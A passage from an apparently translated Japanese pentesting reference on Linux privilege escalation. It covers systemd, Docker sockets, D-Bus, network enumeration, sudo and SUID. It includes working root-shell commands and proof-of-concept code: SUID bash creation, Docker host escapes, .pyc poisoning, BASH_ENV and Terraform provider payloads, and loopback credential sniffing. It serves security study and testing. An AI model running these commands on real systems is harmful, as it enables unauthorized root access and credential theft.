たとえば、`.service` ファイル内に **`ExecStart=/tmp/script.sh`** を指定してbackdoorを作成します。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリへの**書き込み権限**がある場合、それらをbackdoorに置き換えることができます。そうすれば、サービスが再実行されたときにbackdoorが実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH は、次のコマンドで確認できます。

```bash
systemctl show-environment
```

パス内のいずれかのフォルダに**書き込み**できる場合、**権限昇格**できる可能性があります。次のようなサービス設定ファイルで使われている**相対パス**を探してください:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

次に、書き込み可能な systemd PATH フォルダ内に、相対パスで指定されたバイナリと**同じ名前の実行ファイル**を作成します。サービスに脆弱なアクション（**Start**、**Stop**、**Reload**）の実行を要求すると、**backdoor が実行されます**（通常、権限のないユーザーはサービスを開始／停止できませんが、`sudo -l` を使えるか確認してください）。

**サービスについて詳しくは `man systemd.service` を参照してください。**

## **Timers**

**Timers** は、`**.timer**` で終わる名前の systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。**Timers** は cron の代わりとして利用できます。カレンダー時刻イベントと単調時刻イベントを標準でサポートし、非同期で実行できます。

次のコマンドですべての timer を列挙できます。

```bash
systemctl list-timers --all
```

### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit の既存ユニット（`.service` や `.target` など）を実行させることができます。

```bash
Unit=backdoor.service
```

ドキュメントでは、Unitについて次のように説明されています。

> このタイマーの期限が切れたときに起動するユニット。引数には、サフィックスが「.timer」ではないユニット名を指定します。指定しない場合、この値はタイマーユニットと同じ名前で、サフィックスだけが異なるサービスになります（上記参照）。起動するユニット名とタイマーユニット名は、サフィックス以外を同じ名前にすることが推奨されています。

したがって、この権限を悪用するには、次のものを見つける必要があります。

- **書き込み可能なバイナリを実行している** systemdユニット（`.service`など）
- **相対パスを実行しており**、その実行ファイルになりすますために、**systemd PATH**に対する**書き込み権限**を持っている systemdユニット

**`man systemd.timer`でタイマーについて詳しく学びましょう。**

### **タイマーの有効化**

タイマーを有効にするには、root権限を取得して次を実行します。

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` に symlink を作成すると、**timer** が**有効化**されることに注意してください。

## ソケット

Unix Domain Sockets (UDS) は、クライアントサーバーモデルにおいて、同じマシンまたは異なるマシン上の**プロセス間通信**を可能にします。コンピューター間通信には標準的な Unix descriptor files を使用し、`.socket` files を通じて設定します。<sup>[[14]](#references)</sup>

ソケットは `.socket` files を使って設定できます。

**ソケットについて詳しくは `man systemd.socket` を参照してください。** このファイルでは、次のような興味深いパラメーターを設定できます。

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションはそれぞれ異なりますが、ソケットが**どこで待ち受けるかを指定する**ものです（AF_UNIX socket file のパス、待ち受ける IPv4/6 やポート番号など）。
- `Accept`: boolean 引数を取ります。**true** の場合、**着信接続ごとに service instance が起動**され、その接続ソケットのみが渡されます。**false** の場合、すべての待ち受けソケット自体が**起動した service unit に渡され**、すべての接続に対して service unit が1つだけ起動します。datagram sockets と FIFOs では、単一の service unit が無条件ですべての着信トラフィックを処理するため、この値は無視されます。**デフォルトは false** です。パフォーマンス上の理由から、新しい daemon は `Accept=no` に適した形でのみ作成することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを指定します。それぞれ、待ち受け **sockets**/FIFOs が作成・bind される**前**または**後**に**実行**されます。コマンドラインの最初のトークンは絶対ファイル名で、その後にプロセスへの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: 待ち受け **sockets**/FIFOs が close され、削除される**前**または**後**に**実行**される追加の**コマンド**です。
- `Service`: **着信トラフィック**を受けて**有効化する**service unit の名前を指定します。この設定は Accept=no のソケットでのみ使用できます。デフォルトでは、ソケットと同じ名前（suffix は置き換えられます）の service が指定されます。ほとんどの場合、このオプションを使う必要はありません。

### 書き込み可能な .socket files

**書き込み可能な** `.socket` file が見つかった場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような記述を**追加**できます。すると、ソケットが作成される前に backdoor が実行されます。そのため、**マシンが再起動されるまで待つ必要がある**でしょう。\
_この backdoor が実行されるには、システムがその socket file の設定を使用している必要があることに注意してください_

### ソケットの有効化 + 書き込み可能な unit path（service の新規作成）

影響の大きい別の設定ミスは次のとおりです。

- `Accept=no` で `Service=<name>.service` が指定された socket unit
- 参照先の service unit が存在しない
- 攻撃者が `/etc/systemd/system`（または別の unit search path）に書き込める

この場合、攻撃者は `<name>.service` を作成し、ソケットにトラフィックを送ることで、systemd に新しい service を root として読み込ませ、実行させることができます。

簡単な流れ：

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 書き込み可能なソケット

**書き込み可能なソケット**を（ここでは設定用の`.socket`ファイルではなく、Unixソケットについて話しています）**見つけた場合**、そのソケットと**通信できる**ため、脆弱性を悪用できる可能性があります。

### Unixソケットの列挙

```bash
netstat -a -p --unix
```

### Raw接続

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**悪用例:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTPソケット

HTTPリクエストを待ち受けている**ソケット**がある場合があります（`.socket`ファイルのことではなく、Unixソケットとして機能するファイルのことです）。次のコマンドで確認できます:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

ソケットが **HTTP** リクエストに応答する場合、そのソケットと **通信** でき、何らかの **脆弱性を悪用** できる可能性があります。

### 書き込み可能な Docker ソケット

Docker ソケットは、多くの場合 `/var/run/docker.sock` にあり、適切に保護する必要がある重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込みアクセス権を持っていると、権限昇格につながる可能性があります。以下では、その方法と Docker CLI が利用できない場合の代替手段を説明します。

#### **Docker CLI を使用した権限昇格**

Docker ソケットへの書き込みアクセス権がある場合、次のコマンドを使って権限を昇格できます：<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

これらのコマンドを使うと、ホストのファイルシステムに root レベルでアクセスできるコンテナを実行できます。

#### **Docker APIを直接使用する**

Docker CLIが利用できない場合でも、Unix socket経由でraw HTTPを使えば、Docker socketを悪用できます。最も確実な手順は次のとおりです。

- ホストのrootをbind mountした、長時間稼働するhelper containerを作成する
- 起動する
- helper内に`exec`インスタンスを作成する
- `exec`インスタンスを起動し、API経由で出力を読み取る

**Dockerイメージを一覧表示する**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**ヘルパーコンテナを作成して起動する**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**execインスタンスを作成する**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec インスタンスを起動して出力を読み取る**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

このパターンは、`socat` や `nc -U` で `attach` を手動で操作するよりも、通常は堅牢です。`/:/host` を使って helper を作成できれば、追加の `exec` インスタンスを使って `/host/root/...` のようなファイルを読み取ったり、`/host/root/.ssh` に SSH keys を追加したり、ホストの startup files を変更したりできます。

### Others

**`docker` グループのメンバーとして内部にいる**ために docker socket への書き込み権限がある場合、[**権限を昇格する方法は他にもあります**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。[**docker API が port で listen している**場合は、それを侵害できる可能性もあります](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**コンテナから脱出したり、コンテナ runtime を悪用して権限を昇格したりする方法**については、以下を参照してください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

**`ctr`** command を使用できる場合は、**それを悪用して権限を昇格できる可能性があるため**、以下のページを参照してください。


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

**`runc`** command を使用できる場合は、**それを悪用して権限を昇格できる可能性があるため**、以下のページを参照してください。


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、高度な **プロセス間通信（IPC）システム**であり、アプリケーションが効率的に相互作用し、データを共有できるようにします。現代の Linux システムを念頭に設計されており、さまざまな形式のアプリケーション通信に対応する堅牢なフレームワークを提供します。<sup>[[16]](#references)</sup>

このシステムは汎用性が高く、プロセス間のデータ交換を強化する基本的な IPC をサポートしており、**拡張された UNIX domain sockets**を想起させます。また、イベントやシグナルのブロードキャストにも役立ち、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetooth daemon から着信を知らせるシグナルを受け取ると、music player がミュートになり、ユーザー体験が向上します。さらに、D-Bus は remote object system をサポートしており、アプリケーション間の service request や method invocation を簡素化し、従来は複雑だったプロセスを効率化します。

D-Bus は **allow/deny model** に基づいて動作し、一致する policy rule の累積的な効果に応じて、メッセージの権限（method call、signal emission など）を管理します。これらの policy は bus とのやり取りを指定し、権限の悪用による権限昇格を可能にする場合があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にある policy の例を以下に示します。この例では、root user が `fi.w1.wpa_supplicant1` を所有し、そこへメッセージを送信し、そこからメッセージを受信する権限を定めています。

user または group が指定されていない policy はすべてに適用されます。一方、「default」context の policy は、他の特定の policy で対象になっていないすべてに適用されます。

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus通信をenumerateしてexploitする方法はこちら:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙し、そのマシンのネットワーク上での位置を把握するのは、常に興味深いことです。

### 一般的な列挙

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

有効な `/etc/inetd.conf` エントリが GNU Inetutils `telnetd` を root として実行する場合は、ポートがループバックにのみバインドされている場合でも、設定されたバイナリのバージョンとローカルリスナーを確認してください。GNU Inetutils 1.9.3 から 2.7 には、クライアントが指定した `USER` が `login -f` に渡される[telnet認証バイパス](https://seclists.org/oss-sec/2026/q1/89)がありました（CVE-2026-24061）。プロセスやバージョン文字列は兆候にすぎません。露出していると判断する前に、ベンダーのパッチ適用状況と実際のデーモンを確認してください。[Telnet guide](../../../network-services-pentesting/pentesting-telnet.md)に詳しい説明があります。

### アウトバウンドフィルタリングの迅速なトリアージ

ホスト上でコマンドを実行できるのにコールバックが失敗する場合は、DNS、トランスポート、プロキシ、ルートのフィルタリングを手早く切り分けます：

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### 開いているポート

アクセス前に操作できなかったマシン上で稼働しているネットワークサービスを、必ず確認してください。

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

リスナーをバインド先で分類します。

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されています。
- `127.0.0.1` / `::1`: ローカルホストからのみアクセス可能です（トンネル／ポートフォワードの候補として適しています）。
- 特定の内部 IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常、内部セグメントからのみアクセスできます。

### ローカル限定サービスのトリアージ手順

ホストを侵害すると、`127.0.0.1` にバインドされたサービスに、初めてシェルからアクセスできることがよくあります。手早く確認するには、次の手順を使います。

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### ネットワークスキャナーとしてのLinPEAS（ネットワークのみのモード）

ローカルのPEチェックに加えて、linPEASは対象を絞ったネットワークスキャナーとして実行できます。`$PATH` 内で利用可能なバイナリ（通常は `fping`、`ping`、`nc`、`ncat`）を使用し、ツールをインストールすることはありません。

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` を指定せずに `-d`、`-p`、または `-i` を指定すると、linPEAS は純粋なネットワークスキャナーとして動作します（残りの権限昇格チェックはスキップされます）。

### Sniffing

トラフィックをスニッフィングできるか確認してください。できる場合、認証情報を取得できる可能性があります。

```
timeout 1 tcpdump
```

手早く実践できる確認事項：

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback（`lo`）は、内部専用サービスがそこでトークン/Cookie/認証情報を公開していることが多いため、post-exploitation で特に価値があります。

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

今キャプチャし、後で解析する:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## ユーザー

### 一般的な列挙

自分が**誰**なのか、どのような**権限**を持っているのか、システムにどのような**ユーザー**がいるのか、どのユーザーが**login**できるのか、そして誰が**root権限**を持っているのかを確認します。

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### 大きな UID

一部の Linux バージョンには、**UID > INT_MAX** のユーザーが権限昇格できるバグがありました。詳細: [こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、[こちら](https://twitter.com/paragonsec/status/1071152249529884674)。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit するには**、次を実行します: **`systemd-run -t /bin/bash`**

### グループ

root 権限を取得できる**グループのメンバー**になっていないか確認してください:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### クリップボード

クリップボード内に興味深いものがないか確認してください（可能な場合）。

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### パスワードポリシー

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### 既知のパスワード

環境内の**パスワードを知っている**場合は、そのパスワードを使って各ユーザーで**ログインを試してください**。

### Su Brute

大量のノイズが発生しても問題なく、コンピューター上に`su`と`timeout`バイナリがある場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使ってユーザーへの brute-force を試せます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)も、`-a`パラメーターを指定するとユーザーへの brute-force を試みます。

## 書き込み可能な PATH の悪用

### $PATH

**$PATH 内のフォルダーに書き込み可能**であることが分かった場合、書き込み可能なフォルダー内に、別のユーザー（理想的にはroot）が実行するコマンドと同じ名前の**backdoorを作成する**ことで、権限昇格できる可能性があります。そのコマンドが、$PATH 内で書き込み可能なフォルダーより前にあるフォルダーから読み込まれないことが条件です。

### SUDO と SUID

sudoを使ってコマンドを実行できる場合や、コマンドにsuidビットが設定されている場合があります。次の方法で確認してください:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

一部の**予想外のコマンドでは、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能です**。<sup>[[8]](#references)</sup> 例えば:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudoの設定によっては、パスワードを知らなくても、ユーザーが別のユーザーの権限で特定のコマンドを実行できる場合があります。

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

この例では、ユーザー `demo` は `root` として `vim` を実行できます。これで、root のディレクトリに ssh key を追加するか、`sh` を呼び出すだけで簡単に shell を取得できます。

```
sudo vim -c '!sh'
```

### sudo スクリプト内の引用符で囲まれていない Bash 比較

Bash では、`[[ "$protected" == $candidate ]]` の右辺はパターンとして扱われます。root 権限で実行可能な sudo スクリプトが、呼び出し元が制御できるファイルから `candidate` を読み込む場合、`prefix*` のような値が保護対象文字列の先頭部分に一致することがあります。成功時とエラー時で異なる処理経路があると、prefix oracle が露呈する可能性があります。文字列の完全一致を意図する場合は、右辺を引用符で囲んでください（`[[ "$protected" == "$candidate" ]]`）。引用符で囲まれていない比較を悪用可能と判断する前に、実際の sudo 引数、入力元、および外部から観測可能な分岐動作を確認してください。[GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) では、このパターンの動作が定義されています。

### sudo で実行する PrusaSlicer のプロジェクトファイル

呼び出し元がスライス対象の `.3mf` プロジェクトを選べる場合、`prusaslicer` または `prusa-slicer` に対する制限のない root 権限で実行可能な sudo 許可は、確認が必要です。プロジェクトには、G-code のエクスポート時に実行される後処理スクリプトを含められます。細工されたプロジェクトにより、2.6.1 までの PrusaSlicer 内でコマンドを実行できる可能性があります（[CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)）。権限境界を越えられると結論づける前に、実際に有効な sudo ルール、バイナリのバージョンとベンダー提供の修正、プロジェクトの入手元、および該当するエクスポート経路が実行されるかを確認してください。固定されたプロジェクト引数や有効な `NOEXEC` ポリシーによって、結果が変わることがあります。スライサーがインストールされているだけでは、権限昇格の経路があるとは言えません。

### SETENV

このディレクティブを使うと、ユーザーは何かを実行する際に**環境変数を設定できます**：

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

この例は、**HTBマシンAdmirerを基にしており**、rootとしてスクリプトを実行する際に任意のPythonライブラリを読み込む**PYTHONPATH hijacking**に**脆弱でした**:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo で実行可能な Python の import における書き込み可能な `__pycache__` / `.pyc` の poisoning

**sudo で実行可能な Python スクリプト**が、パッケージディレクトリ内に**書き込み可能な `__pycache__`**があるモジュールを import する場合、キャッシュされた `.pyc` を置き換え、次回の import 時に特権ユーザーとしてコードを実行できる可能性があります。<sup>[[30]](#references)</sup>

- 仕組み:
  - CPython はバイトコードキャッシュを `__pycache__/module.cpython-<ver>.pyc` に保存します。<sup>[[31]](#references)</sup>
  - インタープリターは**ヘッダー**（マジックナンバー + ソースに紐付いたタイムスタンプ / ハッシュのメタデータ）を検証し、その後、ヘッダーの後に格納された marshal 化されたコードオブジェクトを実行します。
  - ディレクトリが書き込み可能なためキャッシュファイルを**削除して再作成**できる場合、root 所有で書き込み不可の `.pyc` であっても置き換えられます。
- 一般的なパス:
  - `sudo -l` に、root として実行できる Python スクリプトまたはラッパーが表示される。
  - そのスクリプトが `/opt/app/`、`/usr/local/lib/...` などからローカルモジュールを import する。
  - import されるモジュールの `__pycache__` ディレクトリが、自分のユーザーまたは全ユーザーに対して書き込み可能である。

簡易列挙:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

特権スクリプトを調査できる場合は、インポートされたモジュールとそのキャッシュパスを特定してください:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Abuse workflow:

1. sudoで実行可能なスクリプトを一度実行し、Pythonに正規のキャッシュファイルを作成させます（まだ存在しない場合）。
2. 正規の `.pyc` から先頭16バイトを読み取り、poisoned fileで再利用します。
3. payloadのcode objectをコンパイルして `marshal.dumps(...)` でシリアライズし、元のキャッシュファイルを削除して、元のヘッダーと悪意のあるbytecodeを組み合わせて再作成します。
4. sudoで実行可能なスクリプトをもう一度実行し、import時にpayloadをrootとして実行させます。

重要な注意事項:

- 元のヘッダーを再利用することが重要です。Pythonはキャッシュのメタデータをソースファイルと照合しますが、bytecodeの本体が実際にソースと一致するかどうかは確認しません。
- これは、ソースファイルがroot所有で書き込み不可でも、そのファイルを含む `__pycache__` ディレクトリには書き込み可能な場合に特に有用です。
- `PYTHONDONTWRITEBYTECODE=1` と `python -B` は、Pythonによる新しい `.pyc` ファイルの書き込みを停止しますが、すでに存在する有効なキャッシュが攻撃者によって置き換えられていた場合、その読み込みまでは停止しません。重要な境界は、低い権限のユーザーが、特権ユーザーのimportで受け入れられるキャッシュを置き換えられるかどうかです。Pythonはキャッシュされたbytecodeを読み込む前に、タイムスタンプ／サイズまたはハッシュのメタデータを確認します。[Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) と [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) を参照してください。

最小限のproof-of-conceptの形:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

ハードニング:

- 特権ユーザーの Python import path 内に、低権限ユーザーが書き込み可能なディレクトリがないことを確認します。`__pycache__` も対象です。
- 既存の `.pyc` ファイルを含め、キャッシュディレクトリの所有者とパーミッションを監査します。bytecode の書き込みを無効にすると、新たなキャッシュの作成を減らせますが、置き換え可能な既存のキャッシュは無害化されません。
- 書き込み可能なローカル Python モジュールやキャッシュディレクトリは、root で実行される書き込み可能な shell script や共有ライブラリと同様に扱います。

### sudo env_keep で保持された BASH_ENV → root shell

sudoers が `BASH_ENV` を保持する場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、許可されたコマンドの実行時に Bash の非対話型起動動作を利用して、root として任意のコードを実行できます。<sup>[[24]](#references)</sup>

- 仕組み: 非対話型 shell では、Bash は対象の script を実行する前に `$BASH_ENV` を評価し、そのファイルを読み込みます。多くの sudo ルールでは、script や shell wrapper の実行が許可されています。`BASH_ENV` が sudo によって保持される場合、root 権限でそのファイルが読み込まれます。<sup>[[23]](#references)</sup>

- 要件:
  - 実行可能な sudo ルール（非対話型で `/bin/bash` を起動する対象、または任意の bash script）。
  - `env_keep` に `BASH_ENV` が含まれていること（`sudo -l` で確認）。

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- 強化:
  - `BASH_ENV`（および`ENV`）を`env_keep`から削除し、`env_reset`を優先する。
  - sudoで許可されたコマンドにシェルラッパーを使わず、最小限のバイナリを使用する。
  - 保持された環境変数が使用された場合に備え、sudoのI/Oログ記録とアラートを検討する。

### sudo経由のTerraformで保持されたHOME（!env_reset）

sudoでより高い権限を持つユーザーとしてTerraformを実行できる場合、`!env_reset`は、その特定のルールで実際にどの環境変数が保持されるかを確認する手がかりになります。呼び出し元が書き込み可能な`.terraformrc`または`terraform.rc`を有効なCLI設定として扱う前に、実際に有効な`HOME`または`TF_CLI_CONFIG_FILE`を確認してください。`provider_installation.dev_overrides`の設定が意味を持つのは、指定されたTerraformコマンドがそのプロバイダーを読み込み、かつ呼び出し元が選択されたディレクトリに実行ファイルを配置できる場合に限られます。<sup>[[25]](#references)</sup>

- 必要なプロバイダーの配置先を呼び出し元が書き込み可能なディレクトリに指定し、そのプロバイダー名にちなんだ名前（例：`terraform-provider-examples`）の悪意あるプラグインを配置する:

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root として実行し、SUID shell を残します。

### TF_VAR overrides + symlink validation bypass

